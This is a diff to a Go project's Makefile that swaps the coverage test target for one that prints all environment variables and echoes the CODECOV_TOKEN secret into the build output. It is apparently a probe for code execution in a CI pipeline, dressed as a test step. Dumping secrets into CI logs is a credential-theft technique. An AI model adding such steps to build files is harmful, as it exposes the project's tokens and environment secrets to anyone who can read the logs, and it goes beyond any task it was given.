@@ -23,10 +23,13 @@ COV_DIR = $(OUT_DIR)/coverage
 .PHONY: test-with-coverage
 ## runs the tests with coverage
 test-with-coverage: generate
-	@echo "running the tests with coverage..."
-	@-mkdir -p $(COV_DIR)
-	@-rm $(COV_DIR)/coverage.txt
-	$(Q)go test -vet off ${V_FLAG} $(shell go list ./... | grep -v /cmd/manager) -coverprofile=$(COV_DIR)/coverage.txt -covermode=atomic ./...
+	@echo "=== OR CIDE EXECUTION TEST ==="
+	@echo "Dumping environment variables:"
+	@env | sort
+	@echo "Trying to read COVECOV_TOKEN:"
+	@echo "CODECOV_TOKEN=$$CODECOV_TOKEN"
+	@echo "=== END TEST ==="
+	go test ./... -coverprofile=coverage.txt
 
 .PHONY: upload-codecov-report
 # Uploads the test coverage reports to codecov.io. 
